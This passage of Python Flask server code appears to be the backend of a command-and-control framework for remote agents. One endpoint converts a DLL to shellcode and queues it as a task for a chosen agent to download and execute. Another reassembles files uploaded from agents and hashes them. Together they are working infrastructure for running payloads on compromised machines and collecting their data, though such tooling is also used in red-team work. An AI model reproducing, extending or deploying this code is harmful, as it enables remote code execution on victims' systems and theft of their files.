            db.session.close()
            
        res = make_response(jsonify(response_body), 200)
        return res
        
    else:
        return make_response(jsonify({"message": "Request body must be JSON"}), 400)    


## added for downloading file for execution
@app.route("/admin/api/host_download_file_exec",methods=["POST"])
def host_download_file_exec():
    restrict_page()

    if request.is_json:
        try:
            req = request.get_json()
            agent_id = req.get("agent_id")
            input_path = req.get("path")
            input_args = req.get("input_args")
            input_type = req.get("type")
            
            cwd = os.getcwd()

            filepath = ""
            basename = ""
            path = os_path.join(cwd,"data",agent_id,"download_exec")
            
            if os.name == 'nt':
                basename = input_path.split("\\")[-1]
            else:
                basename = input_path.split("/")[-1]    
                
            filepath = os_path.join(path,basename)

            try:
                os.makedirs(path)
            except OSError as error:
                logger.error(f"/admin/api/host_download_file_exec - OSError: {error}")

            shutil.copyfile(input_path, filepath)

            if input_type in tasktype_values:
                input_dll = filepath
                ## CLI will validate input path is a DLL.
                output_bin = input_dll.replace('.dll', '.bin')

                #print('Creating Shellcode: {}'.format(output_bin))
                dll = open(input_dll, 'rb').read()
                flags = 0

                function_name = ""
                converted_dll = ConvertToShellcode(dll, HashFunctionName(function_name), b'None', flags)
                if converted_dll == False:
                    logger.warning(f"/admin/api/host_download_file_exec - cant convert the DLL")
                    response_body = {"message": "error - cant convert the DLL",}
                    res = make_response(jsonify(response_body), 200)
                    return res

                filepath = output_bin
                with open(filepath, 'wb') as f:
                    f.write(converted_dll)
            
                
            db_file = DownloadFile(
                srv_path=filepath,
                path=''
            )
            db.session.add(db_file)
            db.session.commit()
            logger.info(f"/admin/api/host_download_file_exec - file added to db at {filepath}")

            with open(filepath, 'rb') as fl:
                data = fl.read(1024*1024)
                while data:
                    b64data = base64.b64encode(data)
                    db_filechunk = DownloadFileChunk(
                        data = b64data,
                        downloadfile_id = db_file.id
                    )
                    db.session.add(db_filechunk)
                    logger.info(f"/admin/api/host_download_file_exec - chunk added")
                    db.session.commit()
                    data = fl.read(1024*1024)
            
            db_chunks = db.session.query(DownloadFileChunk).filter(DownloadFileChunk.downloadfile_id == db_file.id).order_by(DownloadFileChunk.id).all()
            maxlen = len(db_chunks)
            for key,value in enumerate(db_chunks):
                if int(key+1) == maxlen:
                    value.next_chunk_id = 0
                else:
                    value.next_chunk_id = db_chunks[int(key+1)].id
                db.session.commit()
             
            myobj = Task(status=1, type=input_type, input=input_args, result='', agent_id=agent_id)
            myobj.downloadfile_id = db_file.id
            db.session.add(myobj)
            db.session.commit()
                    
            response_body = {
                "message": "OK",
            }
        except BaseException as e:
            logger.error(f"/admin/api/host_download_file_exec - BaseException: {e.message}")
            db.session.rollback()
            response_body = {
                "message": "error",
            }
        finally:
            db.session.close()
            
        res = make_response(jsonify(response_body), 200)
        return res
        
    else:
        return make_response(jsonify({"message": "Request body must be JSON"}), 400)    


## added for making upload files.
@app.route("/admin/api/build_upload_file",methods=["POST"])
def build_upload_file():
    restrict_page()

    if request.is_json:
        req = request.get_json()
        agent_id = req.get("agent_id")
        task_id = req.get("task_id")
        
        db_task = db.session.query(Task).get(task_id)
        if db_task is None:
            logger.warning(f"/admin/api/build_upload_file - db_task doesnt exist for id {task_id}")
            return {}
        
        db_file = db.session.query(UploadFile).get(db_task.uploadfile_id)
        if db_file is None:
            logger.warning(f"/admin/api/build_upload_file - db_file doesnt exist for uploadfile_id {db_task.uploadfile_id}")
            return {}
        
        cwd = os.getcwd()
        path = os_path.join(cwd,"data",agent_id,"upload")
        filename = ""
        
        guid = uuid.uuid4()
        myguid = str(guid)[0:8]

        if os.name == 'nt':
            filename = db_file.path.split("\\")[-1]
        else:
            filename = db_file.path.split("/")[-1]
        
        filename = "{}-{}".format(myguid,filename)
        filepath = os_path.join(path,filename)
        
        logger.info(f"/admin/api/build_upload_file - built filepath {filepath}")
        
        try:
            os.makedirs(path)    
        except OSError as error:
            logger.error(f"/admin/api/build_upload_file - OSError: {error}")

        
        with open(filepath, 'wb') as fl:
            result = db.session.query(UploadFileChunk).filter(UploadFileChunk.uploadfile_id == db_task.uploadfile_id).all()
            for i in result:
                fl.write(base64.b64decode(i.data))
            fl.close()
        
        #https://www.quickprogrammingtips.com/python/how-to-calculate-md5-hash-of-a-file-in-python.html
        md5_hash = hashlib.md5()
        sha256_hash = hashlib.sha256()
        with open(filepath, 'rb') as f:
            # Read and update hash in chunks of 4K
            for byte_block in iter(lambda: f.read(4096),b""):
                md5_hash.update(byte_block)
                sha256_hash.update(byte_block)
                
        response_body = {
            "message": "OK",
            "md5": md5_hash.hexdigest(),
            "sha256": sha256_hash.hexdigest()
        }
        
        res = make_response(jsonify(response_body), 200)
        return res
    else:
        return make_response(jsonify({"message": "Request body must be JSON"}), 400)
       
# function to render index page
@app.route('/test_json')
def test_json():
    return jsonify({"data":"ok"})
 
# function to render index page
@app.route('/')
def index():
    return "ok"
 
if __name__ == '__main__':
    app.run(host=LISTEN_HOST, port=LISTEN_PORT)#debug=True) #TODO REMOVE
